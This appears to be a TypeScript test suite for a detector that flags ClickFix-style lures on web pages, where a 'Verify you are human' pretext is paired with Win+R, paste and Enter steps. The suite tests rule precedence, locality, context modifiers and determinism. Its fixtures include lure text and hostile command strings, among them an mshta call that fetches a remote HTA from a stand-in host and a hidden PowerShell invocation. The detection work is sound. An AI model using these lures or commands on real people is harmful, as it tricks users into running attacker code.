import { describe, expect, it } from 'vitest';
import { analyze, ENGINE_VERSION } from '../src/core/index.js';
import type { AnalysisResult, Observation, PageSnapshot } from '../src/core/types.js';
import { inContainer, snapshot } from './fixtures/build.js';
import { KNOWN_LIMITATIONS, SCENARIOS } from './fixtures/scenarios.js';

function sourceText(s: PageSnapshot, o: Observation): string {
  switch (o.source.type) {
    case 'block': return s.blocks.find((b) => b.id === (o.source as { blockId: string }).blockId)!.text;
    case 'hiddenCopy': return s.hiddenCopyCandidates.find((h) => h.id === (o.source as { candidateId: string }).candidateId)!.text;
    case 'copyTrigger': return s.copyTriggers.find((t) => t.id === (o.source as { triggerId: string }).triggerId)!.label;
  }
}

function rules(r: AnalysisResult): string[] {
  return r.findings.map((f) => f.ruleId);
}

describe('scenarios (dev split, snapshot form)', () => {
  for (const sc of SCENARIOS) {
    it(`${sc.id} [${sc.kind}/${sc.lang}] ${sc.description}`, () => {
      const r = analyze(sc.snapshot);
      expect(r.verdict).toBe(sc.expect.verdict);
      if (sc.expect.rules) expect(rules(r)).toEqual(sc.expect.rules);
    });
  }
});

describe('known limitations (documented current behavior, not desired behavior)', () => {
  for (const sc of KNOWN_LIMITATIONS) {
    it(`${sc.id}: ${sc.description}`, () => {
      const r = analyze(sc.snapshot);
      expect(r.verdict).toBe(sc.expect.verdict);
      if (sc.expect.rules) expect(rules(r)).toEqual(sc.expect.rules);
    });
  }
});

describe('evidence integrity', () => {
  const all = [...SCENARIOS, ...KNOWN_LIMITATIONS];
  it('every observation text equals the exact slice of its source text', () => {
    let checked = 0;
    for (const sc of all) {
      const r = analyze(sc.snapshot);
      for (const o of r.observations) {
        expect(o.text).toBe(sourceText(sc.snapshot, o).slice(o.start, o.end));
        expect(o.end).toBeGreaterThan(o.start);
        checked++;
      }
    }
    expect(checked).toBeGreaterThan(100);
  });

  it('every finding references existing observations, its region and an ordered span', () => {
    for (const sc of all) {
      const r = analyze(sc.snapshot);
      const obsIds = new Set(r.observations.map((o) => o.id));
      const regionIds = new Set(r.regions.map((g) => g.id));
      for (const f of r.findings) {
        expect(f.observationIds.length).toBeGreaterThan(0);
        for (const id of f.observationIds) expect(obsIds.has(id)).toBe(true);
        expect(regionIds.has(f.regionId)).toBe(true);
        const region = r.regions.find((g) => g.id === f.regionId)!;
        expect(region.blockIds.indexOf(f.span.firstBlockId)).toBeLessThanOrEqual(region.blockIds.indexOf(f.span.lastBlockId));
        for (const o of r.observations.filter((x) => f.observationIds.includes(x.id))) expect(o.regionId).toBe(f.regionId);
      }
    }
  });

  it('prefers the precise strong match over an overlapping weak one', () => {
    const r = analyze(SCENARIOS.find((s) => s.id === 'S-P1-id')!.snapshot);
    const open = r.observations.filter((o) => o.signal === 'A.OPEN_RUN');
    expect(open.map((o) => o.text)).toEqual(['tombol Windows + R']);
  });

  it('flags deobfuscated matches', () => {
    const sc = SCENARIOS.find((s) => s.id === 'S-P7-en')!;
    const r = analyze(sc.snapshot);
    expect(r.observations.some((o) => o.deobfuscated)).toBe(true);
    const verify = r.observations.find((o) => o.signal === 'P.HUMAN_VERIFY')!;
    expect(verify.text).toBe('Vеrify yоu are h​uman');
  });

  it('region ids are stable and derived from container and block span', () => {
    const r = analyze(SCENARIOS.find((s) => s.id === 'S-P1-en')!.snapshot);
    expect(r.regions.map((g) => g.id)).toEqual(['header:b0-b0', 'modal:b1-b5']);
  });
});

describe('locality: signals never correlate across regions', () => {
  const pretext = 'Verify you are human';
  const chain = ['Press Win+R', 'Press Ctrl+V', 'Press Enter'];

  it('strong pretext in region A does not elevate an execution chain in region B', () => {
    const r = analyze(snapshot([...inContainer('banner', [pretext]), ...inContainer('docs', chain)]));
    expect(rules(r)).toEqual(['R5']);
    expect(r.verdict).toBe('observed_instruction');
    expect(r.findings[0]!.regionId).toBe('docs:b1-b3');
  });

  it('the same content inside one region yields R1', () => {
    const r = analyze(snapshot(inContainer('modal', [pretext, ...chain])));
    expect(rules(r)).toEqual(['R1']);
  });

  it('weak pretexts in another region do not produce R4', () => {
    const r = analyze(snapshot([
      ...inContainer('alert', ['Your account will be suspended within 24 hours. Microsoft Support']),
      ...inContainer('docs', chain),
    ]));
    expect(rules(r)).toEqual(['R5']);
  });

  it('a hidden staged command in another container is not delivered to this region', () => {
    const r = analyze(snapshot(inContainer('modal', [pretext, 'Click the "Verify" button']), {
      hidden: [{ text: 'mshta https://example.invalid/a.hta', containerId: 'footer' }],
    }));
    expect(rules(r)).not.toContain('R2');
    expect(r.verdict).toBe('none');
  });

  it('two runs of the same container separated by another container are different regions', () => {
    const r = analyze(snapshot([
      ...inContainer('main', [pretext]),
      ...inContainer('ad', ['Buy now']),
      ...inContainer('main', chain),
    ]));
    expect(r.regions.map((g) => g.id)).toEqual(['main:b0-b0', 'ad:b1-b1', 'main:b2-b4']);
    expect(rules(r)).toEqual(['R5']);
  });

  it('signals further apart than the window (K=8 blocks) inside one region do not correlate', () => {
    const filler = Array.from({ length: 9 }, (_, i) => `Paragraph ${i} about baking bread.`);
    const r = analyze(snapshot(inContainer('main', [pretext, ...filler, ...chain])));
    expect(rules(r)).toEqual(['R5']);
    const near = analyze(snapshot(inContainer('main', [pretext, ...filler.slice(0, 4), ...chain])));
    expect(rules(near)).toEqual(['R1']);
  });
});

describe('decision rules and precedence', () => {
  it('R1 takes precedence over R2/R4/R5 for overlapping evidence (one finding)', () => {
    const r = analyze(snapshot(
      inContainer('modal', [
        'Verify you are human. Your account will be suspended within 24 hours.',
        'Press Win+R, press Ctrl+V and press Enter.',
        'powershell -w hidden -c calc',
      ]),
    ));
    expect(rules(r)).toEqual(['R1']);
  });

  it('separate lures far apart in one region produce separate findings', () => {
    const filler = Array.from({ length: 9 }, (_, i) => `Filler paragraph ${i}.`);
    const r = analyze(snapshot(inContainer('main', [
      'Verify you are human. Press Win+R, press Ctrl+V and press Enter.',
      ...filler,
      'Open PowerShell, paste the code and press Enter to fix the error.',
    ])));
    expect(rules(r)).toEqual(['R1', 'R4']);
  });

  it('a lone command without a delivery path is not a finding', () => {
    const r = analyze(snapshot(inContainer('main', ['Verify you are human', 'powershell -w hidden -c calc'])));
    expect(r.findings).toEqual([]);
    expect(r.observations.map((o) => o.signal)).toContain('A.COMMAND');
  });

  it('pretext or urgency alone never produces a finding', () => {
    const r = analyze(snapshot(inContainer('main', ['Verify you are human', 'Final warning: act now within 2 hours'])));
    expect(r.findings).toEqual([]);
    expect(r.verdict).toBe('none');
  });

  it('separates classification, confidence and action risk', () => {
    const r3 = analyze(SCENARIOS.find((s) => s.id === 'S-A1-en')!.snapshot).findings[0]!;
    expect(r3).toMatchObject({ classification: 'suspicious_correlation', confidence: 'medium', actionRisk: 'medium' });

    const r4one = analyze(SCENARIOS.find((s) => s.id === 'S-P3-en')!.snapshot).findings[0]!;
    expect(r4one).toMatchObject({ ruleId: 'R4', confidence: 'low', actionRisk: 'high' });

    const r4two = analyze(SCENARIOS.find((s) => s.id === 'S-P2-en')!.snapshot).findings[0]!;
    expect(r4two).toMatchObject({ ruleId: 'R4', confidence: 'medium', actionRisk: 'high' });

    const r5 = analyze(SCENARIOS.find((s) => s.id === 'S-N5-en')!.snapshot).findings[0]!;
    expect(r5).toMatchObject({ classification: 'observed_instruction', confidence: 'high', actionRisk: 'high' });

    const r5partial = analyze(SCENARIOS.find((s) => s.id === 'S-N5-id')!.snapshot).findings[0]!;
    expect(r5partial).toMatchObject({ ruleId: 'R5', actionRisk: 'medium' });
  });
});

describe('context modifiers', () => {
  it('reported speech demotes two tiers and lowers confidence', () => {
    const f = analyze(SCENARIOS.find((s) => s.id === 'S-N4-en')!.snapshot).findings[0]!;
    expect(f.ruleClassification).toBe('manipulative_instruction');
    expect(f.classification).toBe('observed_instruction');
    expect(f.modifiers.map((m) => m.id)).toContain('C.REPORTED');
    expect(f.confidence).toBe('medium');
  });

  it('quotation demotes two tiers', () => {
    const r = analyze(snapshot(inContainer('article', ['Verify you are human. Press Win+R, then Ctrl+V and press Enter.'], { quote: true })));
    expect(r.findings[0]!.modifiers.map((m) => m.id)).toEqual(['C.QUOTED']);
    expect(r.verdict).toBe('observed_instruction');
  });

  it('educational framing alone demotes only one tier', () => {
    const r = analyze(snapshot(inContainer('main', ['Verify you are human. Press Win+R, then Ctrl+V and press Enter.'], {}, 'Security awareness')));
    const f = r.findings[0]!;
    expect(f.modifiers.map((m) => m.id)).toEqual(['C.EDUCATIONAL']);
    expect(f.classification).toBe('suspicious_correlation');
  });

  it('code example plus educational framing demotes two tiers (capped)', () => {
    const f = analyze(SCENARIOS.find((s) => s.id === 'S-N1-en')!.snapshot).findings[0]!;
    expect(f.modifiers.map((m) => m.id).sort()).toEqual(['C.CODE_EXAMPLE', 'C.EDUCATIONAL']);
    expect(f.classification).toBe('observed_instruction');
    expect(f.confidence).toBe('low');
  });

  it('negated actions are excluded and recorded; a conjunction ends the negation scope (D-020)', () => {
    const r = analyze(SCENARIOS.find((s) => s.id === 'S-N6-en')!.snapshot);
    // "Never press Win+R and paste code…": the open step is negated, so no chain can form.
    // "paste" follows "and", so it is deliberately NOT negated (robustness against S-A5-style evasion).
    expect(r.observations.filter((o) => o.negated).map((o) => o.signal)).toEqual(['A.OPEN_RUN']);
    expect(r.observations.some((o) => o.signal === 'C.NEGATION')).toBe(true);
    expect(r.verdict).toBe('none');
  });

  it('a reported/quoted decoy does not absorb a direct lure in the same region', () => {
    const r = analyze(snapshot(inContainer('main', [
      'Attackers instructed victims to press Win+R, then Ctrl+V and Enter.',
      'Verify you are human. Press Win+R, press Ctrl+V and press Enter.',
    ])));
    expect(r.verdict).toBe('manipulative_instruction');
    const f = r.findings.find((x) => x.classification === 'manipulative_instruction')!;
    expect(f.modifiers).toEqual([]);
    expect(f.span).toEqual({ firstBlockId: 'b1', lastBlockId: 'b1' });
  });

  it('reported cue in a preceding block ending with ":" binds list items', () => {
    const r = analyze(snapshot(inContainer('article', [
      'The fake page displays "Verify you are human". The attackers instructed visitors to:',
      'Press Win+R',
      'Press Ctrl+V',
      'Press Enter',
    ], { article: true })));
    const f = r.findings[0]!;
    expect(f.ruleClassification).toBe('manipulative_instruction');
    expect(f.modifiers.map((m) => m.id)).toEqual(['C.REPORTED']);
    expect(r.verdict).toBe('observed_instruction');
  });
});

describe('domain independence and determinism', () => {
  it('url and title never change the result', () => {
    for (const sc of SCENARIOS) {
      const a = analyze(sc.snapshot);
      const b = analyze({ ...sc.snapshot, url: 'https://www.microsoft.com/en-us/security', title: 'How to spot scams' });
      const c = analyze({ ...sc.snapshot, url: 'http://192.0.2.7/x.php', title: '' });
      expect(b).toEqual(a);
      expect(c).toEqual(a);
    }
  });

  it('is deterministic', () => {
    for (const sc of SCENARIOS) expect(analyze(sc.snapshot)).toEqual(analyze(sc.snapshot));
  });

  it('does not mutate its input', () => {
    const sc = SCENARIOS[0]!;
    const copy = structuredClone(sc.snapshot);
    analyze(sc.snapshot);
    expect(sc.snapshot).toEqual(copy);
  });

  it('reports the engine version', () => {
    expect(analyze(SCENARIOS[0]!.snapshot).engineVersion).toBe(ENGINE_VERSION);
  });
});

describe('input contract and bounds', () => {
  it('rejects unknown schema versions and duplicate block ids', () => {
    const s = snapshot(['a']);
    expect(() => analyze({ ...s, schemaVersion: 2 } as unknown as PageSnapshot)).toThrow(/schemaVersion/);
    expect(() => analyze({ ...s, blocks: [s.blocks[0]!, s.blocks[0]!] })).toThrow(/duplicate/i);
  });

  it('truncates oversized blocks and reports it', () => {
    const r = analyze(snapshot(['x'.repeat(50_000)]));
    expect(r.coverage.coreTruncated).toBe(true);
  });

  it('passes extractor coverage through', () => {
    const s = snapshot(['a']);
    const r = analyze({ ...s, coverage: { framesSkipped: 2, truncated: true, closedShadowRootsSkipped: 1 } });
    expect(r.coverage).toEqual({ framesSkipped: 2, truncated: true, closedShadowRootsSkipped: 1, coreTruncated: false });
  });

  it('analyzes a 5,000-block snapshot within the CI bound', () => {
    const texts = Array.from({ length: 5000 }, (_, i) =>
      i % 500 === 0 ? 'Verify you are human. Press Win+R, press Ctrl+V and press Enter.' : `Ordinary paragraph number ${i} with some text about cooking and travel.`);
    const s = snapshot(texts.map((t, i) => ({ t, c: `c${Math.floor(i / 50)}` })));
    const t0 = performance.now();
    const r = analyze(s);
    const ms = performance.now() - t0;
    console.log(`[perf] 5000 blocks analyzed in ${ms.toFixed(1)} ms`);
    expect(ms).toBeLessThan(1000);
    expect(r.findings.filter((f) => f.ruleId === 'R1')).toHaveLength(10);
    expect(r.findings.filter((f) => f.classification !== 'observed_instruction')).toHaveLength(10);
  });
});

describe('AnalyzeOptions (research ablations)', () => {
  it('defaults reproduce the M1 model exactly', () => {
    for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
      const base = analyze(sc.snapshot);
      expect(analyze(sc.snapshot, {})).toEqual(base);
      expect(analyze(sc.snapshot, { windowBlocks: 8, contextModifiers: true, negation: true, experimental: {} })).toEqual(base);
    }
  });

  it('switches change behavior only as documented', () => {
    const n4 = SCENARIOS.find((s) => s.id === 'S-N4-en')!.snapshot;
    expect(analyze(n4, { contextModifiers: false }).verdict).toBe('manipulative_instruction');
    const n6 = SCENARIOS.find((s) => s.id === 'S-N6-en')!.snapshot;
    expect(analyze(n6, { negation: false }).verdict).not.toBe('none');
    const n8 = KNOWN_LIMITATIONS.find((s) => s.id === 'S-N8-en')!.snapshot;
    expect(analyze(n8, { experimental: { r4ExcludeAuthorityOnly: true } }).verdict).toBe('observed_instruction');
    const p3 = SCENARIOS.find((s) => s.id === 'S-P3-en')!.snapshot;
    expect(analyze(p3, { experimental: { r4MinWeakFamilies: 2 } }).verdict).toBe('observed_instruction');
    const far = snapshot(inContainer('main', ['Verify you are human', ...Array.from({ length: 9 }, () => 'filler'), 'Press Win+R', 'Press Ctrl+V', 'Press Enter']));
    expect(analyze(far, { windowBlocks: Infinity }).verdict).toBe('manipulative_instruction');
  });
});
